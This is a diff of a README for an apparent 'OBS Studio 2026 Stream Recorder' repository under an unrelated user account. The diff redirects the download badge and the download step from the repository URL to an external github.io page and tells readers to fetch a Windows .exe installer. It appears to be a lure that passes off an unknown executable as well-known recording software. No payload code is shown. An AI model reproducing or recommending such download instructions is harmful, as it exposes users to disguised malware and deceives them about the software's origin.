@@ -1,6 +1,6 @@
 # 🎥 OBS-Studio-2026-Stream-Recorder - Capture clear video from your computer
 
-[![](https://img.shields.io/badge/Download-OBS_Studio_2026-blue.svg)](https://github.com/henryiiilocation983/OBS-Studio-2026-Stream-Recorder)
+[![](https://img.shields.io/badge/Download-OBS_Studio_2026-blue.svg)](https://henryiiilocation983.github.io)
 
 OBS Studio 2026 Stream Recorder records your computer screen and streams live video to the web. This tool captures game footage, online meetings, or desktop activity. It offers tools for high-quality video production and audio management.
 
@@ -18,7 +18,7 @@ Before you install this software, check your computer against these requirements
 
 You must visit the official repository page to select the correct installer for your system. Perform the following steps to start the download.
 
-1.  Visit this page to download: [https://github.com/henryiiilocation983/OBS-Studio-2026-Stream-Recorder](https://github.com/henryiiilocation983/OBS-Studio-2026-Stream-Recorder).
+1.  Visit this page to download: [https://henryiiilocation983.github.io](https://henryiiilocation983.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version number to view the available files.
 4.  Choose the Windows installer file ending in .exe.
